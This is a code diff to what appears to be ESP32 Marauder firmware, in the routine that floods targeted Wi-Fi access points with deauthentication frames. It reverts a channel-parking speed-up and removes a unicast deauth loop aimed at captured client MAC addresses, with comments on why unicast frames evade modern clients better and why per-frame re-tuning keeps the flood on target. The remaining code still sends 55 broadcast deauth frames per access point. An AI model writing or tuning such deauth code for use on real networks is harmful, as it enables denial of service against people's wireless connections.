@@ -13844,31 +13844,15 @@ void WiFiScan::main(uint32_t currentTime)
               this->sendDeauthFrame(access_point.bssid, access_point.channel, dst_mac_bytes);
           }
         } else {
-          // Park the radio on this AP's channel ONCE, then burst all 55 frames
-          // without re-tuning on every frame -- roughly halves the per-AP dwell,
-          // so the flood cycles through selected APs about twice as fast.
-          this->set_channel = access_point.channel;
-          this->changeChannel(access_point.channel);
+          // Re-assert the target AP's channel before EVERY frame (sendDeauthFrame's
+          // switch_channel defaults to true). This is the stock Marauder broadcast
+          // behaviour, and it is robust: on the dual-band C5 in soft-AP mode the
+          // AP's own beacon can pull the radio back to its configured channel
+          // between frames, so a "park once then blast 55" burst drifts off the
+          // target's channel and the deauths miss. Per-frame re-tuning keeps the
+          // whole burst on-channel. Correctness beats the small speed gain.
           for (int r = 0; r < 55; r++) {
-            this->sendDeauthFrame(access_point.bssid, access_point.channel, dst_mac_bytes, false);
-          }
-          // ALSO hit every client we actually captured for this AP with a
-          // UNICAST deauth. Broadcast deauths are widely ignored by modern
-          // clients; a unicast frame addressed to the real client MAC is far more
-          // effective (short of PMF/802.11w, which defeats all deauth). Clients
-          // are captured by an AP+STA ("Sniff Stations") scan; this safely
-          // no-ops when none were captured (null list) and bounds-checks the
-          // station indices.
-          if (access_point.stations != nullptr) {
-            for (int x = 0; x < access_point.stations->size(); x++) {
-              uint16_t sidx = access_point.stations->get(x);
-              if (sidx < stations->size()) {
-                Station sta = stations->get(sidx);   // copy; mac must outlive TX
-                for (int r = 0; r < 15; r++)
-                  this->sendDeauthFrame(access_point.bssid, access_point.channel,
-                                        sta.mac, false);
-              }
-            }
+            this->sendDeauthFrame(access_point.bssid, access_point.channel, dst_mac_bytes);
           }
         }
       }
